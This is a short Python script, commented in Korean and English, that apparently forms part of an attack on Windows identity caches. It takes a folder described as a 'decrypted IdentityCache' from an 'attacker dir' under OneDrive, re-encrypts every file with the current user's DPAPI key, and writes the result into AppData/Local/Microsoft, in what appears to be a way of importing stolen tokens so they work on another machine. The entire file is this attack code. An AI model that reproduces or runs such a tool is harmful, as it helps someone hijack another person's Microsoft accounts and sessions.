import os
import win32crypt

def dpapi_encrypt(decrypted_data):
    try:
        encrypted_data = win32crypt.CryptProtectData(decrypted_data, None, None, None, None, 0)
        return encrypted_data
    except Exception as e:
        print(f"Error during encryption: {str(e)}")
        return None

def encrypt_and_save(decrypted_file_path):
    #decrypted_file_path에서 데이터 읽어와서 DPAPI encrypt한 후 target_path에 저장
    home = os.path.expanduser('~')
    target_path = os.path.join(home, 'AppData', 'Local', 'Microsoft', decrypted_file_path)

    #open decrypted_file
    try:
        with open(decrypted_file_path, 'rb') as f:
            decrypted_data = f.read()
    except Exception as e:
        print(f"open_input_file failed: {e}")

    encrypted_text = dpapi_encrypt(decrypted_data)

    #save encrypted file in attacker's storage
    try:
        with open(target_path, 'wb') as f:
            f.write(encrypted_text)
    except Exception as e:
        print(f"open_output_file failed: {e}")

def dfs_folder_structure(folder_path):
    home = os.path.expanduser('~')
    migration_path = os.path.join(home, 'AppData', 'Local', 'Microsoft', folder_path)
    os.makedirs(migration_path, exist_ok=True)
    try:
        for entry in os.listdir(folder_path):
            entry_path = os.path.join(folder_path, entry)
            if os.path.isdir(entry_path):
                dfs_folder_structure(entry_path)
            else:
               encrypt_and_save(entry_path)
    except Exception as e:
        print(f"Error: {e}")



user_home = os.path.expanduser('~')
attacker_dir = os.path.join(user_home, 'Onedrive', 'data')
#data 안에 IdedntityCache 까지 경로를 줘야하는지 확인

if os.path.exists(attacker_dir):    #attacker dir(decrypted IdentityCache)가 존재하는 경우에만 코드 실행
    dfs_folder_structure(attacker_dir)
